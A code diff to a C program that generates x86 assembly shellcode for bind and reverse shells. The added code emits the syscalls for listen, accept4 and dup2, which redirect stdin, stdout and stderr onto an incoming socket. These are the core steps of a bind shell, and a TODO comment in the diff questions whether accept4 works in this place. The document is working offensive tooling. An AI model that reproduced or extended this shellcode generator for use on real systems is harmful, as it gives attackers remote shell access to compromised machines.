@@ -38,6 +38,7 @@ static void store_in_reg(uint32_t value, reg32_t reg);
 /* To write "recipes" for bind shell, reverse shell, etc. */
 static void build_syscall3(uint16_t syscall, uint32_t arg_ebx, uint32_t arg_ecx,
     uint32_t arg_edx); 
+static void build_syscall2(uint16_t syscall, uint32_t arg_ebx, uint32_t arg_ecx); 
 static void store_result(reg32_t result, reg32_t destination);
 static void build_sockaddr(uint32_t ipv4, uint16_t port, uint16_t family);
 
@@ -228,8 +229,27 @@ static void store_in_reg(uint32_t value, reg32_t reg)
     }
 }
 
-static void build_syscall3(uint16_t syscall, uint32_t arg_ebx, uint32_t arg_ecx,
-    uint32_t arg_edx)
+static void build_syscall2(uint16_t syscall, uint32_t arg_ebx, 
+    uint32_t arg_ecx)
+{
+    dprintf(temp_fd, "\t; Syscall %d: (%d, %d)\n",
+        syscall, arg_ebx, arg_ecx);
+
+    store_in_reg(syscall, eax);
+    if (arg_ebx != SKIP_PARAM)
+    {
+        store_in_reg(arg_ebx, ebx);
+    }
+    if (arg_ecx != SKIP_PARAM)
+    {
+        store_in_reg(arg_ecx, ecx);
+    }
+
+    dprintf(temp_fd, "\tint 0x80\n\n");
+}
+
+static void build_syscall3(uint16_t syscall, uint32_t arg_ebx, 
+    uint32_t arg_ecx, uint32_t arg_edx)
 {
     dprintf(temp_fd, "\t; Syscall %d: (%d, %d, %d)\n",
         syscall, arg_ebx, arg_ecx, arg_edx);
@@ -306,6 +326,23 @@ int main(int argc, char * argv[])
     /* fd was placed in ebx with store_result()
      * sockaddr * was placed in ecx with store_result()
      */
+
+    // listen(fd, backlog)
+    build_syscall2(SYS_listen, SKIP_PARAM, 1);
+    /* fd was set previously
+     */
+
+    // accept(fd, 0, 0)
+    build_syscall3(SYS_accept4, SKIP_PARAM, 0, 0);
+    // TODO: correct or broken b/c of accept4 in place of accept?
+
+    // pass connected fd to next syscall
+    store_result(eax, ebx);
+
+    // Assembly will be more verbose than if hand-coded
+    build_syscall2(SYS_dup2, SKIP_PARAM, STDIN_FILENO);
+    build_syscall2(SYS_dup2, SKIP_PARAM, STDOUT_FILENO);
+    build_syscall2(SYS_dup2, SKIP_PARAM, STDERR_FILENO);
 
     if (close(temp_fd))
     {
